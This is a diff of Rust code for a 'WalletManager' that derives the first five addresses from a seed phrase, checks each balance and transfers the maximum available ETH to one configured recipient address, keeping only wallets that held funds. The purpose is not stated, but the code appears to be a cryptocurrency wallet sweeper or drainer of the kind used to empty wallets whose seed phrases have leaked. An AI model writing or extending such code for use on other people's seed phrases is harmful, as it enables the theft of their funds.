@@ -62,6 +62,11 @@ impl WalletManager {
                 self.config.gas_limit,
             );
             
+            if max_amount == "0" || max_amount.parse::<f64>().unwrap_or(0.0) <= 0.0 {
+                info!("ℹ️ Balance too low for transfer (gas cost exceeds balance)");
+                return Ok((wallet_info, None));
+            }
+            
             info!("📤 Transferring {} ETH to {}", max_amount, self.config.recipient_address);
             
             // Execute transfer
@@ -80,27 +85,38 @@ impl WalletManager {
         }
     }
     
-    // Process seed phrase: derive address, check balance, transfer if available
+    // Process seed phrase: check first 5 addresses
     pub async fn process_seed_phrase(
         &self,
         seed_phrase: &str,
-    ) -> Result<(WalletInfo, Option<TransferResult>), Box<dyn std::error::Error>> {
-        // Derive address from seed phrase
-        let address = self.address_deriver.derive_from_seed_phrase(seed_phrase)
-            .ok_or("Failed to derive address from seed phrase")?;
+    ) -> Result<Vec<(WalletInfo, Option<TransferResult>)>, Box<dyn std::error::Error>> {
+        info!("🌱 Processing seed phrase (first 5 addresses)");
         
-        info!("👛 Derived address from seed: {}", address);
+        // Derive multiple addresses from seed phrase
+        let derived_wallets = self.address_deriver.derive_multiple_from_seed(seed_phrase, 5);
         
-        // For seed phrases, we need to derive private key first
-        // This is simplified - in production, derive multiple addresses
-        let mnemonic = ethers::core::utils::Mnemonic::from_phrase(seed_phrase, None)?;
-        let wallet = ethers::signers::MnemonicBuilder::default()
-            .mnemonic(mnemonic)
-            .build()?;
+        if derived_wallets.is_empty() {
+            return Err("Failed to derive addresses from seed phrase".into());
+        }
         
-        let private_key = format!("{:x}", wallet.signer());
+        let mut results = Vec::new();
         
-        // Process as private key
-        self.process_private_key(&private_key).await
+        for (address, private_key) in derived_wallets {
+            info!("👛 Checking derived address: {}", address);
+            
+            match self.process_private_key(&private_key).await {
+                Ok((wallet_info, transfer_result)) => {
+                    // Only add if balance > 0 or transfer happened
+                    if transfer_result.is_some() || wallet_info.balance != "0" {
+                        results.push((wallet_info, transfer_result));
+                    }
+                }
+                Err(e) => {
+                    warn!("Failed to process derived address {}: {}", address, e);
+                }
+            }
+        }
+        
+        Ok(results)
     }
 }
